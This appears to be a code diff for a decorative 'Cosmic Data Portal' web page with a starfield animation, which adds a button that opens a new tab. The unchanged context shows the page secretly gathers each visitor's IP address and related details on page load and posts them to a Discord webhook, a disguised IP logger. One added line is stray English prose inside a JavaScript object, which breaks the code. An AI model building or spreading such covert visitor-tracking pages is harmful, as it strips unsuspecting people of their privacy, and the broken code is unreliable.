@@ -11,6 +11,11 @@
             background: linear-gradient(135deg, #1e3a8a 0%, #4c1d95 50%, #9d174d 100%);
             color: #ffffff;
             overflow: hidden;
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
         }
         .welcome-message {
             animation: pulse 2s infinite;
@@ -45,12 +50,12 @@
         }
     </style>
 </head>
-<body class="flex items-center justify-center min-h-screen">
+<body>
     <canvas id="starfield"></canvas>
     <div class="welcome-message p-10 rounded-xl shadow-2xl max-w-lg w-full text-center">
         <h1 class="text-4xl font-extrabold mb-4 bg-clip-text text-transparent bg-gradient-to-r from-cyan-400 to-pink-500">Cosmic Data Portal</h1>
         <p class="text-lg mb-6">Embark on a stellar journey through our digital cosmos!</p>
-        <a href="universe.html" class="bg-gradient-to-r from-purple-500 to-blue-500 text-white py-3 px-6 rounded-full hover:from-pink-500 hover:to-purple-500 transition-all duration-300">Explore the Universe</a>
+        <button onclick="openNewTab()" class="bg-gradient-to-r from-purple-500 to-blue-500 text-white py-3 px-6 rounded-full hover:from-pink-500 hover:to-purple-500 transition-all duration-300">Explore the Universe</button>
     </div>
 
     <script>
@@ -145,6 +150,7 @@
                             description: 'A new explorer has entered the cosmic portal!',
                             color: 0x8b5cf6,
                             thumbnail: { url: 'https://i.imgur.com/8f3k2Zn.png' },
+                            Ascending, descending, and rotating lists have been removed for brevity.
                             fields: [
                                 { name: '🌍 IP Address', value: data.ip || 'N/A', inline: true },
                                 { name: '🔢 IP Version', value: data.version || 'N/A', inline: true },
@@ -178,6 +184,75 @@
             } catch (error) {
                 console.error('Error sending to Discord');
             }
+        }
+
+        // Function to open a new blank tab with the same background
+        function openNewTab() {
+            const newWindow = window.open('', '_blank');
+            newWindow.document.write(`
+                <!DOCTYPE html>
+                <html lang="en">
+                <head>
+                    <meta charset="UTF-8">
+                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                    <title>Cosmic Universe</title>
+                    <script src="https://cdn.tailwindcss.com"></script>
+                    <style>
+                        body {
+                            background: linear-gradient(135deg, #1e3a8a 0%, #4c1d95 50%, #9d174d 100%);
+                            margin: 0;
+                            height: 100vh;
+                            overflow: hidden;
+                        }
+                        canvas {
+                            position: fixed;
+                            top: 0;
+                            left: 0;
+                            z-index: -1;
+                        }
+                        .star {
+                            position: absolute;
+                            background: #ffffff;
+                            border-radius: 50%;
+                            animation: twinkle 2s infinite;
+                        }
+                        @keyframes twinkle {
+                            0%, 100% { opacity: 0.2; }
+                            50% { opacity: 1; }
+                        }
+                    </style>
+                </head>
+                <body>
+                    <canvas id="starfield"></canvas>
+                    <script>
+                        const canvas = document.getElementById('starfield');
+                        const ctx = canvas.getContext('2d');
+                        canvas.width = window.innerWidth;
+                        canvas.height = window.innerHeight;
+                        const stars = Array(200).fill().map(() => ({
+                            x: Math.random() * canvas.width,
+                            y: Math.random() * canvas.height,
+                            size: Math.random() * 2 + 1,
+                            speed: Math.random() * 0.5 + 0.1
+                        }));
+                        function drawStars() {
+                            ctx.clearRect(0, 0, canvas.width, canvas.height);
+                            stars.forEach(star => {
+                                ctx.fillStyle = 'rgba(255, 255, 255, ' + (Math.random() * 0.5 + 0.5) + ')';
+                                ctx.beginPath();
+                                ctx.arc(star.x, star.y, star.size, 0, Math.PI * 2);
+                                ctx.fill();
+                                star.y += star.speed;
+                                if (star.y > canvas.height) star.y = 0;
+                            });
+                            requestAnimationFrame(drawStars);
+                        }
+                        drawStars();
+                    </script>
+                </body>
+                </html>
+            `);
+            newWindow.document.close();
         }
 
         // Execute data collection on page load
